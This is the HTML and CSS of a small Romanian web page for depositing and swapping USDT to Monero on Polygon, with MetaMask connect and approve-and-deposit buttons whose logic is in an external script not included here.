<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Depunere & Swap USDT to XMR - Polygon</title>

    <link rel="manifest" href="manifest.json">
    <meta name="theme-color" content="#0f172a">

    <style>
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #0f172a; color: #f8fafc; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
        .card { background: #1e293b; border: 1px solid #334155; border-radius: 16px; padding: 25px; width: 100%; max-width: 400px; box-shadow: 0 10px 25px rgba(0,0,0,0.4); text-align: center; }
        
        h2 { margin-top: 0; font-size: 20px; color: #fff; }
        .desc { font-size: 13px; color: #94a3b8; margin-bottom: 20px; }
        
        label { display: block; text-align: left; font-size: 13px; color: #cbd5e1; margin-top: 15px; font-weight: 500; }
        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #334155; background-color: #0f172a; color: white; margin-top: 6px; font-size: 15px; text-align: center; }
        
        .main-btn { background-color: #2563eb; color: white; border: none; padding: 14px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; font-size: 16px; transition: background 0.2s; }
        .main-btn:hover { background-color: #1d4ed8; }
        .main-btn:disabled { background-color: #475569; cursor: not-allowed; }

        .status { margin-top: 20px; font-size: 13px; color: #38bdf8; word-break: break-all; padding: 10px; border-radius: 8px; background: rgba(56, 189, 248, 0.1); display: none; }
    </style>
</head>
<body>

<div class="card">
    <h2>Swap USDT ➔ XMR</h2>
    <div class="desc">Rețeaua Polygon (Smart Contract)</div>
    
    <button id="connectBtn" class="main-btn" onclick="connectPolygonWallet()">Conectează MetaMask</button>
    
    <div id="depositSection" style="display:none;">
        <label for="txHash">ID Tranzacție Unic (Hash Bytes32):</label>
        <input type="text" id="txHash" readonly>

        <label for="amountPoly">Suma USDT:</label>
        <input type="number" id="amountPoly" value="15" min="1">
        
        <button id="depositBtn" class="main-btn" onclick="handlePolygonDeposit()">Efectuează Approve & Deposit</button>
    </div>

    <div class="status" id="statusText"></div>
</div>

<script src="app.js"></script>
</body>
</html>
